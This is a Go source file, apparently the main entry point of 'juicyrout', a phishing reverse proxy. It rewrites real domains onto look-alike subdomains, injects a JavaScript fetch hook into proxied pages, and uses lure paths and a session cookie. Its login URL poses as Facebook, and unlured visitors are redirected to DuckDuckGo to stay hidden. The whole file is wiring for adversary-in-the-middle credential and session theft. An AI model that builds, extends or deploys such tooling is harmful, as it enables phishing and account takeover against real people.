package main

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/fiber/v2/middleware/session"
)

//go:embed js/fetch-hook.js
var jsHookScript string

// TODO cli args
func main() {
	var port string
	flag.StringVar(&port, "p", "8091", "listening port")
	flag.Parse()
	// TODO configure transport
	client := &http.Client{}
	// TODO static map www.example.com -> mail.com (from config file)
	conv := NewDomainConverter("host.juicyrout:" + port)
	conv.AddStaticMapping("www.w3.org", "www.w3.org")
	req := NewRequestProcessor(conv)
	resp := NewResponseProcessor(conv, jsHookScript)

	// TODO from config file
	store := session.New(session.Config{
		Expiration:     30 * time.Minute,
		KeyLookup:      "cookie:session_id",
		CookieDomain:   "host.juicyrout",
		CookieSecure:   true,
		CookieHTTPOnly: true,
	})

	app := fiber.New(fiber.Config{
		StreamRequestBody:     true,
		DisableStartupMessage: true,
		IdleTimeout:           10 * time.Second,
	})

	app.Use(recover.New())
	auth := NewAuthMiddleware(AuthConfig{
		CookieName:     "session_id",
		Store:          store,
		InvalidAuthURL: "https://duckduckgo.com",
		LoginURL:       fmt.Sprintf("https://www-facebook-com.host.juicyrout:%s/", port),
		LureService:    NewStaticLureService([]string{"/abc/def"}),
	})
	proxy := NewProxyHandler(client, req, resp)

	// allowed HTTP methods with auth
	httpMethods := []string{
		fiber.MethodGet,
		fiber.MethodHead,
		fiber.MethodPost,
		fiber.MethodPut,
		fiber.MethodDelete,
		fiber.MethodPatch,
	}
	for _, method := range httpMethods {
		app.Add(method, "/*", auth, proxy)
	}
	// for CORS preflight requests
	app.Options("/*", proxy)

	if err := app.ListenTLS(":"+port, "cert.pem", "key.pem"); err != nil {
		log.Println("listen error", err)
	}
}
